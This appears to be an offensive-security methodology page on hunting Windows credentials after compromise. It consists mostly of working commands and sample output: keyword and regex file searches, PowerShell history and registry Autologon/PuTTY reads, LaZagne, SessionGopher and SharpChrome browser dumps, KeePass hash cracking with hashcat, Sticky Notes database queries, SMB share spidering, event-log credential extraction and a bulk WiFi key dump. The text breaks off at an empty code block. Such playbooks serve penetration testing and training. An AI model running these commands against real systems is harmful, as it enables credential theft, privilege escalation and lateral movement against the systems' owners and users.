# Local Credential Exposure & Abuse

### Overview

**Credentials Hunting** is the systematic search for passwords, keys, and authentication secrets left behind in various locations across Windows systems. During post-exploitation, attackers enumerate file systems, registries, application data, and network shares to discover hardcoded passwords, saved credentials, configuration files, and other sensitive information that can facilitate privilege escalation, lateral movement, and persistence.

**Key Concepts:**

* **Credential Storage** - Locations where passwords are commonly stored
* **Configuration Files** - Applications storing credentials in configs
* **Browser Credentials** - Saved passwords in web browsers
* **DPAPI** - Data Protection API encrypting user secrets
* **Network Shares** - Shared drives containing sensitive files

**Why this matters:** Credentials hunting enables:

* Discovery of privileged account passwords
* Access to additional systems and services
* Privilege escalation opportunities
* Lateral movement across network
* Understanding of security posture
* Identification of credential reuse patterns

**Attack advantages:**

* Uses native Windows tools (difficult to detect)
* Often yields quick wins (plaintext passwords)
* Reveals organizational password patterns
* Finds forgotten or legacy credentials
* Discovers service account passwords

**Common credential locations:**

* Configuration files (web.config, unattend.xml)
* PowerShell history files
* Registry keys (Autologon, PuTTY)
* Browser password stores
* Network shares (SYSVOL, IT shares)
* Application-specific locations (KeePass, Sticky Notes)

***

### Exploitation Workflow Summary

1. Keyword-Based File Search ├─ Search for "password", "cred", "key" in filenames ├─ Search file contents for credential patterns ├─ Target common file extensions (.txt, .ini, .config, .xml) └─ Enumerate user directories and shares
2. Application-Specific Enumeration ├─ Browser credentials (Chrome, Firefox, Edge) ├─ Password managers (KeePass, LastPass) ├─ Remote access tools (PuTTY, WinSCP, mRemoteNG) ├─ VPN clients └─ Email applications
3. Registry Credential Search ├─ Autologon credentials ├─ PuTTY saved sessions ├─ VNC passwords ├─ Saved Windows credentials └─ Application-specific registry keys
4. PowerShell and Command History ├─ PowerShell history files ├─ Console command history ├─ Script files in user directories └─ Transcription logs
5. Network Share Enumeration ├─ Enumerate accessible shares ├─ Search SYSVOL for scripts/GPP ├─ IT/Admin shares └─ User home directories
6. Automated Credential Extraction ├─ LaZagne for multi-application extraction ├─ SessionGopher for remote session creds ├─ SharpChrome for Chrome passwords └─ Specialized tools per application
7. Post-Discovery Validation ├─ Test discovered credentials ├─ Document credential scope ├─ Check for credential reuse └─ Escalate or move laterally

***

### Keyword-Based Search Strategy

#### Essential Search Keywords

**Primary keywords:**

```
password
passwd
pwd
pass
credential
cred
username
user
account
login
key
secret
token
api_key
```

**Configuration-specific:**

```
dbpassword
dbcredential
db_user
db_pass
admin
administrator
sa_password
connection_string
config
configuration
```

**Application-specific:**

```
passphrase
passkey
vnc
rdp
ssh
ftp
smtp
```

#### File Extension Targets

**High-value extensions:**

```
.txt     - Plain text files
.ini     - Configuration files
.cfg     - Configuration files
.config  - Application configs (web.config, app.config)
.xml     - XML configs
.yml     - YAML configs
.json    - JSON configs
.ps1     - PowerShell scripts
.bat     - Batch scripts
.cmd     - Command scripts
.vbs     - VBScript files
.log     - Log files
.git     - Git configuration
.kdbx    - KeePass databases
.rdp     - Remote Desktop configs
```

***

### Search Tools and Techniques

#### Windows Search Interface

**Using built-in Windows Search:**

**Step 1: Access Windows Search**

```
Windows Key + S
Or: Windows Explorer → Search box
```

**Step 2: Search for credential files**

```
Search query: password
Location: C:\Users
```

**Filters:**

```
type:.txt
type:.config
datemodified:lastyear
```

**Why this works:**

* Indexes common user directories
* Fast for recent files
* GUI-friendly for manual enumeration

**Limitations:**

* Requires indexing enabled
* May miss files in non-indexed locations
* Doesn't search file contents by default

#### Findstr - Content Search

**Basic password search:**

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

**Parameters explained:**

* `/S` - Search subdirectories
* `/I` - Case-insensitive
* `/M` - Print only filename if match found
* `/C:"password"` - Search for exact string "password"

**Expected output:**

```
C:\Users\bob\Documents\notes.txt
C:\inetpub\wwwroot\web.config
C:\Scripts\deploy.ps1
```

**Recursive search from C:\Users:**

```cmd
cd C:\Users
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

**Search for multiple patterns:**

```cmd
findstr /SIM /C:"password" /C:"credential" /C:"pwd" *.config *.xml
```

**Search specific file:**

```cmd
findstr /I /C:"pass" C:\inetpub\wwwroot\web.config
```

**Show line numbers:**

```cmd
findstr /SIN /C:"password" *.txt
```

**Expected output:**

```
notes.txt:15:password: MySecretP@ss123
```

#### PowerShell Search Methods

**Search for files with "password" in filename:**

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include *password*,*cred*,*pass* -File -ErrorAction SilentlyContinue
```

**Expected output:**

```
Directory: C:\Users\bob\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/21/2024   9:45 AM           1024 passwords.txt
-a----        11/15/2024   2:30 PM           2048 wifi_passwords.docx
```

**Search file contents:**

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.config,*.xml -ErrorAction SilentlyContinue | Select-String "password" -List
```

**Expected output:**

```
C:\Users\bob\Documents\notes.txt:5:Admin password: P@ssw0rd123
C:\inetpub\wwwroot\web.config:12:connectionString="Server=SQL01;Database=App;User=sa;Password=SQLAdmin123!"
```

**Search specific patterns:**

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password\s*=\s*['\"]([^'\"]+)['\"]"
```

**Targeted user directory search:**

```powershell
Get-ChildItem -Path C:\Users\$env:USERNAME\Documents -Recurse -Include *.txt,*.docx,*.xlsx -ErrorAction SilentlyContinue | Select-String "password","credential","pass" -List
```

#### Advanced Search with For Loops

**Search and display matching files:**

```cmd
for /R C:\Users %i in (*) do @findstr /I /C:"pass" "%i" >nul && echo %i
```

**What this does:**

* `/R C:\Users` - Recursive search in C:\Users
* `%i in (*)` - For each file
* `findstr /I /C:"pass" "%i"` - Search for "pass"
* `>nul` - Suppress output
* `&& echo %i` - Print filename if match found

**Search specific file types:**

```cmd
for /R C:\ %i in (*.conf *.txt *.bat *.ps1) do @findstr /I /C:"pass" "%i" >nul && echo %i
```

**Expected output:**

```
C:\Scripts\deploy.bat
C:\Users\bob\Documents\notes.txt
C:\xampp\apache\conf\httpd.conf
```

**Double percent for batch files:**

```cmd
REM In batch file, use %%i instead of %i
for /R C:\Users %%i in (*.txt) do @findstr /I /C:"password" "%%i" >nul && echo %%i
```

#### Dir Command Searches

**Search by filename pattern:**

```cmd
dir /S /B C:\*password*.txt
```

**Parameters:**

* `/S` - Search subdirectories
* `/B` - Bare format (path only)
* `C:\*password*.txt` - Files with "password" in name

**Expected output:**

```
C:\Users\bob\Documents\passwords.txt
C:\Backup\old_passwords.txt
```

**Multiple patterns:**

```cmd
dir /S /B C:\*pass*.txt C:\*pass*.xml C:\*pass*.ini C:\*cred* C:\*vnc* C:\*.config
```

**Search network drive:**

```cmd
dir /S /B N:\*cred*
```

**Expected output:**

```
N:\IT\Scripts\credentials.txt
N:\Admin\Configs\db_credentials.xml
```

***

### Automated Credential Hunting Tools

#### LaZagne

**What is LaZagne:** Python tool that extracts credentials from common Windows applications.

**Supported applications:**

```
Browsers: Chrome, Firefox, Edge, Opera
Email: Outlook, Thunderbird
Chat: Pidgin, Skype
Databases: SQLite, DBVisualizer
WiFi: Windows WiFi passwords
Sysadmin: PuTTY, WinSCP, FileZilla, OpenVPN
Git: Git credentials
```

**Basic execution:**

```cmd
C:\Tools> lazagne.exe all
```

**Expected output:**

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyCool123
Port: 22

------------------- Wifi passwords -----------------

[+] Password found !!!
SSID: Corp_WiFi
Authentication: WPA2-PSK
Password: C0rpW1F1P@ss!

------------------- Chrome passwords -----------------

[+] Password found !!!
URL: https://webmail.corp.local
Login: bob@corp.local
Password: MyEmailPass123!
```

**Run specific module:**

```cmd
lazagne.exe browsers
lazagne.exe wifi
lazagne.exe sysadmin
```

**Save output to file:**

```cmd
lazagne.exe all -oN output.txt
```

#### SessionGopher

**What is SessionGopher:** PowerShell tool that extracts saved session credentials for remote access tools.

**Targets:**

```
PuTTY
WinSCP
FileZilla
SuperPuTTY
mRemoteNG
Remote Desktop
```

**Basic usage:**

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
```

**Expected output:**

```
[+] PuTTY Session Found
Source       : HKCU:\Software\SimonTatham\PuTTY\Sessions\Production_Server
Session      : Production_Server
Hostname     : 10.10.10.50
Username     : admin
Password     : (Encrypted - use -o flag to decrypt)

[+] WinSCP Session Found
Source       : C:\Users\bob\AppData\Roaming\WinSCP.ini
Session      : SFTP_Server
Hostname     : sftp.corp.local
Username     : sftpadmin
Password     : SFTP_P@ssw0rd
```

**Target specific computer:**

```powershell
Invoke-SessionGopher -Target WORKSTATION01
```

**Search all computers in domain (requires admin):**

```powershell
Invoke-SessionGopher -AllDomain
```

**Output to CSV:**

```powershell
Invoke-SessionGopher -Thorough -o csv
```

#### EvilTree - Regex Search

**What is EvilTree:** Python tool for recursive credential hunting with regex patterns.

**Basic usage:**

```bash
python3 eviltree.py -r C:\Users -k password,passwd,admin,account,user,token -i -v -q
```

**Parameters:**

* `-r C:\Users` - Root directory to search
* `-k password,passwd` - Keywords to search for
* `-i` - Case-insensitive
* `-v` - Verbose output
* `-q` - Quiet mode (less output)

**Regex pattern search:**

```bash
python3 eviltree.py -r C:\inetpub -x ".{0,3}passw.{0,3}[=]{1}.{0,18}"
```

**What this regex does:**

```
.{0,3}     - 0-3 characters before "passw"
passw      - Literal "passw"
.{0,3}     - 0-3 characters after "passw"
[=]{1}     - Equals sign
.{0,18}    - Capture up to 18 characters (the password)
```

**Matches patterns like:**

```
password=MyP@ss123
db_password="SecretDB!"
admin_passwd: AdminPass456
```

**Expected output:**

```
[+] File: C:\inetpub\wwwroot\web.config
    Match: connectionString="...;Password=SQLAdmin123!;..."
    
[+] File: C:\Scripts\deploy.ps1
    Match: $password="Deploy_P@ss"
    
[+] File: C:\Users\bob\Documents\notes.txt
    Match: VPN password: VPN_Access123
```

**Target specific file types:**

```bash
python3 eviltree.py -r C:\xampp -k password,db_,admin -e config,ini,php,txt
```

***

### Configuration File Hunting

#### Web.config Files

**What is web.config:** IIS/ASP.NET configuration file often containing database connection strings and authentication credentials.

**Search for web.config:**

```cmd
dir /S /B C:\inetpub\wwwroot\web.config
```

**Alternative with PowerShell:**

```powershell
Get-ChildItem -Path C:\ -Recurse -Include web.config -ErrorAction SilentlyContinue
```

**Common locations:**

```
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\<AppName>\web.config
C:\xampp\htdocs\web.config
```

**View web.config:**

```cmd
type C:\inetpub\wwwroot\web.config
```

**Expected sensitive content:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="DefaultConnection" 
         connectionString="Server=SQL01;Database=AppDB;User Id=sa;Password=SQLAdmin123!;" 
         providerName="System.Data.SqlClient" />
  </connectionStrings>
  
  <appSettings>
    <add key="AdminPassword" value="WebAdmin_P@ss!" />
    <add key="APIKey" value="sk-1234567890abcdef" />
  </appSettings>
  
  <system.web>
    <authentication mode="Forms">
      <forms loginUrl="~/Login.aspx" defaultUrl="~/Default.aspx" 
             userName="admin" password="FormAuth123!" />
    </authentication>
  </system.web>
</configuration>
```

**Extract connection strings:**

```powershell
Select-String -Path C:\inetpub\wwwroot\web.config -Pattern "connectionString" -Context 0,2
```

#### Unattend.xml Files

**What is unattend.xml:** Windows deployment answer file that may contain AutoLogon credentials.

**Search for unattend.xml:**

```powershell
Get-ChildItem -Path C:\ -Filter "unattend.xml" -Recurse -ErrorAction SilentlyContinue
```

**Common locations:**

```
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Unattend\unattend.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\unattend.xml
```

**View unattend.xml:**

```cmd
type C:\Windows\Panther\unattend.xml
```

**Expected sensitive content:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>WORKSTATION01</ComputerName>
        </component>
    </settings>
    
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-Shell-Setup">
            <UserAccounts>
                <LocalAccounts>
                    <LocalAccount wcm:action="add">
                        <Password>
                            <Value>FirstUser_P@ss</Value>
                            <PlainText>true</PlainText>
                        </Password>
                        <DisplayName>First User</DisplayName>
                        <Group>Administrators</Group>
                        <Name>firstuser</Name>
                    </LocalAccount>
                </LocalAccounts>
            </UserAccounts>
        </component>
    </settings>
</unattend>
```

**Extract passwords:**

```powershell
Select-String -Path C:\Windows\Panther\unattend.xml -Pattern "<Value>.*</Value>" -AllMatches
```

#### Application Configuration Files

**Search all config files:**

```powershell
Get-ChildItem -Path C:\ -Recurse -Include *.config,*.ini,*.cfg -ErrorAction SilentlyContinue | Select-String "password" -List
```

**Common application config locations:**

```
C:\Program Files\<Application>\config\app.config
C:\Users\<user>\AppData\Roaming\<Application>\settings.ini
C:\ProgramData\<Application>\config.xml
```

***

### PowerShell History Files

#### Understanding PowerShell History

**PowerShell saves command history to:**

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Why this matters:**

* Users type passwords in commands
* Scripts with hardcoded credentials
* Connection strings with passwords
* Administrative tasks revealing secrets

#### Locating History File

**Get history file path:**

```powershell
(Get-PSReadLineOption).HistorySavePath
```

**Expected output:**

```
C:\Users\bob\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Reading History File

**View history:**

```powershell
gc (Get-PSReadLineOption).HistorySavePath
```

**Expected output:**

```
dir
cd C:\inetpub
Get-Service
net user admin P@ssw0rd123 /add
net localgroup Administrators admin /add
Invoke-WebRequest -Uri https://api.service.com -Headers @{Authorization="Bearer sk-1234567890"}
$password = ConvertTo-SecureString "MySecureP@ss!" -AsPlainText -Force
New-ADUser -Name "Service Account" -AccountPassword $password
Connect-MsolService -Credential (Get-Credential)
# Username: admin@corp.com Password typed: AdminCloud123!
```

**Common credential patterns:**

```
net user <user> <password>
$password = "..."
-Password "..."
-Credential
ConvertTo-SecureString "password"
mysql -u root -pMyPassword
psexec \\server -u admin -p password
```

#### Enumerate All User Histories

**PowerShell one-liner:**

```powershell
foreach($user in ((ls C:\Users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

**What this does:**

1. Lists all user directories in C:\Users
2. For each user, reads their PowerShell history
3. Suppresses errors for inaccessible files

**Expected output:**

```
# User: bob
cd Documents
Get-ADUser administrator
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /u:admin /p:AdminP@ss123!

# User: alice
Import-Module ActiveDirectory
$cred = Get-Credential # Entered: alice:AlicePass456!
Get-ADComputer -Credential $cred
```

***

### Registry Credential Locations

#### Windows Autologon

**Check Autologon configuration:**

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Expected output if configured:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    AutoAdminLogon      REG_SZ       1
    DefaultUserName     REG_SZ       administrator
    DefaultPassword     REG_SZ       Admin_P@ssw0rd123!
    DefaultDomainName   REG_SZ       CORP
```

**Key values:**

* **AutoAdminLogon: 1** - Autologon enabled
* **DefaultUserName** - Account that auto-logs in
* **DefaultPassword** - **PLAINTEXT PASSWORD**
* **DefaultDomainName** - Domain (if domain-joined)

**PowerShell method:**

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

#### PuTTY Saved Sessions

**List PuTTY sessions:**

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

**Expected output:**

```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Production_Server
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Dev_Server
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

**View session details:**

```powershell
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Production_Server"
```

**Expected output:**

```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\Production_Server
    HostName           REG_SZ    10.10.10.50
    UserName           REG_SZ    sysadmin
    PortNumber         REG_DWORD    0x16 (22)
    ProxyMethod        REG_DWORD    0x5
    ProxyHost          REG_SZ    proxy.corp.local
    ProxyPort          REG_DWORD    0x50 (80)
    ProxyUsername      REG_SZ    proxyuser
    ProxyPassword      REG_SZ    ProxyP@ss123!
```

**Why proxy credentials matter:** PuTTY can store proxy authentication credentials in plaintext for HTTP proxies.

#### VNC Passwords

**VNC password registry locations:**

```cmd
reg query HKCU\Software\ORL\WinVNC3\Password
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

**Note:** VNC passwords are encrypted but use weak encryption (DES with known key).

#### Saved Windows Credentials

**List saved credentials:**

```cmd
cmdkey /list
```

**Expected output:**

```
Currently stored credentials:

    Target: Domain:interactive=CORP\admin
    Type: Domain Password
    User: CORP\admin

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: corp\dbadmin
    
    Target: MicrosoftAccount:target=login.live.com
    Type: Generic  
    User: bob@outlook.com
```

**What this shows:**

* Saved domain credentials
* RDP saved credentials (TERMSRV)
* Microsoft account credentials

**Use saved credentials:**

```cmd
runas /savecred /user:CORP\admin cmd.exe
```

**Why this works:** If credentials are saved, runas will use them without prompting for password.

***

### Browser Credential Extraction

#### Google Chrome

**Chrome credential location:**

```
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

**SharpChrome extraction:**

```powershell
.\SharpChrome.exe logins /unprotect
```

**Expected output:**

```
  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0

[*] Action: Chrome Saved Logins Triage

[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0

--- Chrome Credential ---

file_path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data
signon_realm: https://webmail.corp.local/
origin_url: https://webmail.corp.local/login
username: bob@corp.local
password: MyEmailP@ss123!
times_used: 45
date_created: 12/15/2024 9:30:00 AM

--- Chrome Credential ---

file_path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data
signon_realm: https://portal.office.com/
origin_url: https://portal.office.com/
username: bob@corp.com
password: Office365Pass!
times_used: 127
date_created: 10/3/2024 2:15:00 PM
```

**Chrome Custom Dictionary:**

```powershell
gc 'C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

**Expected output:**

```
Password1234!
MyP@ssw0rd
AdminPassword123
```

#### Firefox

**LaZagne for Firefox:**

```cmd
lazagne.exe browsers -firefox
```

**Expected output:**

```
[+] Firefox passwords

URL: https://gitlab.corp.local
Login: developer
Password: DevGitPass123!

URL: https://jira.corp.local  
Login: bob
Password: JiraP@ss456
```

#### Multi-Browser Extraction

**HackBrowserData tool:**

```cmd
HackBrowserData.exe
```

**Extracts from:**

* Chrome
* Edge
* Firefox
* Opera
* Brave
* All Chromium-based browsers

**Expected output:**

```
[*] Extracting credentials from all browsers...

[+] Chrome - 15 passwords found
[+] Firefox - 8 passwords found
[+] Edge - 12 passwords found

[*] Results saved to:
    - results/chrome_passwords.csv
    - results/firefox_passwords.csv
    - results/edge_passwords.csv
```

***

### KeePass Database Hunting

#### Locating KeePass Databases

**Search for .kdbx files:**

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue
```

**Common locations:**

```
C:\Users\<user>\Documents\Passwords.kdbx
C:\Users\<user>\Desktop\keepass.kdbx
C:\Backups\passwords.kdbx
\\FileServer\IT\KeePass\corporate.kdbx
```

#### Extracting KeePass Hash

**Using keepass2john:**

```bash
keepass2john Passwords.kdbx > keepass.hash
```

**Expected output:**

```
Passwords:$keepass$*2*60000*0*048f742ba4e83db43180a31b429023defcb09a2e4110956e218a498c90bfc39a*2f3c5560d95ead326c79f32988cbab81bafcabbd4cd69cd237a1d2fbadd7fb84*1eef873a28851d1fcd946d2b24bd29f6*d68c6859ae565c09ddc5b81c39d87565cc8c50338a3fb9e6e0a3425e55b0b7a3*35683df41573246ad58a3fdad9a764d7b5d4e3610e1a021be2f2f1018523c065
```

#### Cracking KeePass Database

**Using hashcat:**

```bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

**Parameters:**

* `-m 13400` - KeePass hash mode
* `keepass.hash` - Hash file
* `rockyou.txt` - Wordlist

**Expected output:**

```
$keepass$*2*60000*0*048f74...3c065:password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
```

**Open database with password:**

```
Install KeePass or KeePassXC
Open Passwords.kdbx
Enter password: password123
```

**Expected database contents:**

```
Entry: Domain Admin Account
Username: CORP\Administrator
Password: DomainAdmin_P@ss123!
URL: https://dc01.corp.local
Notes: Primary domain admin account

Entry: SQL Server SA
Username: sa
Password: SQLServer_Admin456!
URL: sql01.corp.local:1433
Notes: SQL Server system administrator

Entry: VPN Access
Username: vpnuser
Password: VPN_Access789!
URL: vpn.corp.local
Notes: Corporate VPN credentials
```

***

### Sticky Notes Credential Extraction

#### Understanding Sticky Notes Storage

**Sticky Notes database location:**

```
C:\Users\<username>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
```

**Database files:**

```
plum.sqlite
plum.sqlite-shm
plum.sqlite-wal
```

#### Manual Extraction

**Step 1: Locate Sticky Notes files**

```powershell
ls C:\Users\$env:USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
```

**Expected output:**

```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/21/2024  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----        12/21/2024  11:59 AM            982 Ecs.dat
-a----        12/21/2024  11:59 AM           4096 plum.sqlite
-a----        12/21/2024  11:59 AM          32768 plum.sqlite-shm
-a----        12/21/2024  12:00 PM         197792 plum.sqlite-wal
```

**Step 2: Copy database files**

```cmd
copy "C:\Users\bob\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite*" C:\Temp\
```

**Step 3: View with DB Browser for SQLite**

```
1. Download DB Browser for SQLite
2. Open plum.sqlite
3. Browse Data → Note table
4. View "Text" column
```

#### PowerShell Extraction with PSSQLite

**Import PSSQLite module:**

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1
```

**Query Sticky Notes database:**

```powershell
$db = "C:\Users\bob\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

**Expected output:**

```
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter Login
\id=e4adae4c-a40b-48b4-93a5-900247852f96 
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 vcenter.corp.local
Username: root
Password: Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Meeting notes - Thycotic demo tomorrow 10am
\id=8f9e2a1b-3c4d-5e6f-7a8b-9c0d1e2f3a4b SQL Server Credentials
sa password: SQL_P@ssw0rd_2024!
```

#### Using Strings Command

**Extract text from database:**

```bash
strings plum.sqlite-wal | grep -i password
```

**Expected output:**

```
root:Vc3nt3R_adm1n!
SQL sa password: SQL_P@ssw0rd_2024!
WiFi password: Corp_WiFi_Key_123
```

***

### Network Share Enumeration

#### Local Share Enumeration

**List local shares:**

```cmd
net share
```

**Expected output:**

```
Share name   Resource                        Remark
-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
IT-Share     D:\IT-Department                IT Department Files
Backups      E:\Backups                      System Backups
The command completed successfully.
```

**View share permissions:**

```cmd
net share IT-Share
```

**Expected output:**

```
Share name        IT-Share
Path              D:\IT-Department
Remark            IT Department Files
Maximum users     No limit
Users             CORP\IT-Team
Caching           Caching disabled
Permission        CORP\IT-Team, FULL
The command completed successfully.
```

#### Remote Share Enumeration

**View shares on remote computer:**

```cmd
net view \\DC01 /all
```

**Expected output:**

```
Shared resources at \\DC01

Share name   Type   Used as  Comment
---------------------------------------------------------------
ADMIN$       Disk            Remote Admin
C$           Disk            Default share  
IPC$         IPC             Remote IPC
NETLOGON     Disk            Logon server share
SYSVOL       Disk            Logon server share
IT$          Disk            IT Administrative Share
The command completed successfully.
```

**Access share:**

```cmd
dir \\DC01\SYSVOL\corp.local\scripts
```

#### Automated Share Discovery

**Using Manspider:**

```bash
manspider.py --threads 50 192.168.1.0/24 -d "CORP" -u "bob" -p "password" --content "password"
```

**What this does:**

* Scans 192.168.1.0/24 for SMB shares
* Authenticates as CORP\bob
* Searches file contents for "password"
* Uses 50 concurrent threads

**Expected output:**

```
[+] Found: \\DC01\SYSVOL\corp.local\Policies\{GUID}\Machine\Scripts\startup.bat
    Match: net use Z: \\FileServer\Data /user:svcaccount P@ssw0rd123

[+] Found: \\FileServer\IT$\Scripts\deploy.ps1
    Match: $cred = New-Object PSCredential("admin", (ConvertTo-SecureString "AdminP@ss!" -AsPlainText -Force))

[+] Found: \\FileServer\Backups\config.xml
    Match: <password>BackupP@ssw0rd456</password>
```

**Using Snaffler:**

```cmd
Snaffler.exe -s -d corp.local -o snaffler.log
```

**Parameters:**

* `-s` - Scan for interesting files
* `-d corp.local` - Domain to scan
* `-o snaffler.log` - Output file

**Expected output:**

```
[+] Interesting file: \\FileServer\Users\bob\Documents\passwords.txt
[+] Interesting file: \\FileServer\IT$\Configs\web.config
[+] Interesting file: \\DC01\SYSVOL\corp.local\scripts\setup.bat
[+] Credential found in: \\FileServer\Data\app.config
    User: dbadmin
    Password: DB_P@ssw0rd
```

***

### DPAPI Credential Extraction

**DPAPI (Data Protection API)** encrypts user credentials. See dedicated DPAPI section for full extraction techniques.

**Quick check for DPAPI-protected credentials:**

```cmd
dir /s /b C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
dir /s /b C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\
```

**What you'll find:**

* Chrome/Edge encrypted passwords
* Windows Vault credentials
* Outlook passwords
* RDP credentials
* WiFi passwords

**Extraction requires:**

* User's master key
* Or SYSTEM privileges to access all keys

***

### Credentials from Event Logs

#### Using NetExec Module

**Extract credentials from event logs:**

```bash
nxc smb 10.10.10.50 -u bob -p password -M eventlog_creds
```

**What this searches:**

```
Event ID 4648: Logon with explicit credentials
Event ID 4624: Successful logon (may contain credentials in some cases)
Application logs with credentials in messages
```

**Expected output:**

```
[*] eventlog_creds module
[+] Found credential in Event ID 4648
    Target Server: SQL01
    Account: sa
    Password: SQLAdmin_P@ss123!

[+] Found credential in Application log
    Service: BackupService
    Username: CORP\backupsvc
    Password: Backup_Svc_P@ss!
```

***

### WiFi Password Extraction

#### Saved WiFi Profiles

**List saved WiFi networks:**

```cmd
netsh wlan show profiles
```

**Expected output:**

```
Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Corp_WiFi
    All User Profile     : Guest_Network
    All User Profile     : HOME-5G
    All User Profile     : Starbucks_WiFi
```

**Extract WiFi password:**

```cmd
netsh wlan show profile Corp_WiFi key=clear
```

**Expected output:**

```
Profile Corp_WiFi on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : Corp_WiFi
    Control options        : Connection mode: Connect automatically
                             Network broadcast: Connect only if this network is broadcasting

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "Corp_WiFi"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension       : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Security key           : Present
    Key Content            : C0rpW1F1P@ss123!    <-- PASSWORD HERE
```

**Extract all WiFi passwords:**

```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```

#### Using NetExec

**Dump WiFi passwords remotely:**

```bash
